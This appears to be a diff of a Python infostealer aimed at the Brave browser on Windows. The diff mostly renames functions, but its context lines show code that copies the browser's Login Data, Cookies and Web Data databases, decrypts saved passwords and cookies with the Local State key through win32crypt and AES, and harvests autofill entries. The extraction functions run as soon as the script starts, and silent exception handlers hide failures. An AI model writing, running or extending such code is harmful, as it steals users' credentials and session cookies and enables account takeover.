@@ -5,9 +5,10 @@ import json
 import os
 #import requests
 #import threading
+#import sys
 from Crypto.Cipher import AES
 import win32crypt
-import sys
+
 
 
 ##?? use this function?
@@ -98,7 +99,7 @@ def decrypt_string(string, key):
 ##Extract passwords
 ##
 
-def save_passwords(db_dir, keyDir):
+def fetch_passwords(db_dir, keyDir):
     try:
         db_path = os.path.join(os.environ["USERPROFILE"], db_dir)
         file = "passwords.db"
@@ -136,7 +137,7 @@ def save_passwords(db_dir, keyDir):
     except:
         pass
 
-save_passwords(r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data", r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
+fetch_passwords(r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data", r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
 
 ##
 ##Extract cookies
@@ -169,7 +170,7 @@ fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Netw
 ##Extract encrypted cookies and decrypt them
 ##
 
-def d_fetch_cookies(dir, keyDir):
+def decrypt_fetch_cookies(dir, keyDir):
     try:
         file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
         shutil.copy(file, "cookies.db")
@@ -191,7 +192,7 @@ def d_fetch_cookies(dir, keyDir):
     except:
         pass
 
-d_fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies", r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
+decrypt_fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies", r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
 
 ##
 ##Extract history
@@ -350,6 +351,5 @@ def fetch_autofill(dir):
         delete_file("autofill.db")
     except:
         pass
-    
     
 fetch_autofill(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data")
